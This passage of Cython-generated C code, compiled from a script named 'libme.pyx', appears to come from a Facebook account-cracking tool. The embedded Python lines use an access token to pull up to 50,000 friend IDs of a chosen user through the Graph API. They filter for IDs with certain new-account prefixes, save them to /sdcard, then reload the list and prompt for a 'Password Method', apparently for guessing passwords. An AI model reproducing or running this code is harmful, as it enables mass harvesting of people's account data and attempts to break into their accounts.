          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100076, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 881, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100078, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 881, __pyx_L21_error)
          __pyx_t_14 = __pyx_t_15;
          __pyx_L32_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_15 = (__pyx_t_14 != 0);
          if (__pyx_t_15) {

            /* "libme.pyx":882
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])             # <<<<<<<<<<<<<<
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 */
            __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 882, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_4 = PyNumber_Add(__pyx_t_8, __pyx_kp_s__38); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 882, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 882, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_t_8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 882, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_id, __pyx_t_5); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 882, __pyx_L21_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":883
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')             # <<<<<<<<<<<<<<
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 */
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 883, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 883, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_17 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__38); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 883, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 883, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_18 = PyNumber_Add(__pyx_t_17, __pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 883, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__39); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 883, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            __pyx_t_18 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_18)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_18);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_5 = (__pyx_t_18) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_18, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_4);
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 883, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":881
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:             # <<<<<<<<<<<<<<
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 */
          }

          /* "libme.pyx":880
 * 				file = open(___file , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])
 */
        }
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        /* "libme.pyx":875
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L28_try_end;
      __pyx_L21_error:;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":884
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()
 */
      __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
      if (__pyx_t_7) {
        __Pyx_AddTraceback("libme.James.__100__07__", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_5, &__pyx_t_8) < 0) __PYX_ERR(0, 884, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_8);

        /* "libme.pyx":885
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(___file, 'r').readlines()
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__45, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 885, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L22_exception_handled;
      }
      goto __pyx_L23_except_error;
      __pyx_L23_except_error:;

      /* "libme.pyx":875
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L22_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L28_try_end:;
    }

    /* "libme.pyx":872
 * 		os.system("rm -rf /sdcard/10_0.txt")
 * 		___file = ("/sdcard/10_0.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  }
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":886
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()             # <<<<<<<<<<<<<<
 * 		__id=open(___file, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 */
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 886, __pyx_L1_error) }
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_close); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 886, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 886, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":887
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()
 * 		__id=open(___file, 'r').readlines()             # <<<<<<<<<<<<<<
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 */
  __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 887, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_INCREF(__pyx_v____file);
  __Pyx_GIVEREF(__pyx_v____file);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v____file);
  __Pyx_INCREF(__pyx_n_s_r);
  __Pyx_GIVEREF(__pyx_n_s_r);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_r);
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_8, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 887, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_readlines); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 887, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 887, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_v___id = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":888
 * 		file.close()
 * 		__id=open(___file, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))             # <<<<<<<<<<<<<<
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):
 */
  __pyx_t_9 = PyObject_Length(__pyx_v___id); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 888, __pyx_L1_error)
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 888, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_92m_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 888, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 888, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":889
 * 		__id=open(___file, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))             # <<<<<<<<<<<<<<
 * 	def __100__00__(self):
 * 		try:
 */
  __pyx_t_8 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Extra_Dump_Files_saved_in_s, __pyx_v____file); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 889, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 889, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":861
 * 		elif __33__33__ == "3":
 * 			self.__me__nnn__()
 * 	def __100__07__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("libme.James.__100__07__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v___total);
  __Pyx_XDECREF(__pyx_v____file);
  __Pyx_XDECREF(__pyx_v_zx);
  __Pyx_XDECREF(__pyx_v___ids);
  __Pyx_XDECREF(__pyx_v_rex);
  __Pyx_XDECREF(__pyx_v_ex);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v___id);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":890
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/10_0.txt'
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_57__100__00__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_57__100__00__ = {"__100__00__", (PyCFunction)__pyx_pw_5libme_5James_57__100__00__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_57__100__00__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__100__00__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_56__100__00__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_56__100__00__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__100__00__", 0);

  /* "libme.pyx":891
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/10_0.txt'
 * 			for line in open(file, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":892
 * 	def __100__00__(self):
 * 		try:
 * 			file = '/storage/emulated/0/10_0.txt'             # <<<<<<<<<<<<<<
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __Pyx_INCREF(__pyx_kp_s_storage_emulated_0_10_0_txt);
      __pyx_v_file = __pyx_kp_s_storage_emulated_0_10_0_txt;

      /* "libme.pyx":893
 * 		try:
 * 			file = '/storage/emulated/0/10_0.txt'
 * 			for line in open(file, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 893, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_file);
      __Pyx_GIVEREF(__pyx_v_file);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_file);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 893, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 893, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 893, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 893, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 893, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 893, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 893, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 893, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 893, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 893, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":894
 * 			file = '/storage/emulated/0/10_0.txt'
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(file))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 894, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 894, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 894, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 894, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":893
 * 		try:
 * 			file = '/storage/emulated/0/10_0.txt'
 * 			for line in open(file, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":891
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/10_0.txt'
 * 			for line in open(file, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":895
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Please Dump File first %s not found"%(file))
 * 		ask = input("  [!] Password Method [y/t] : ")
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__100__00__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 895, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":896
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(file))             # <<<<<<<<<<<<<<
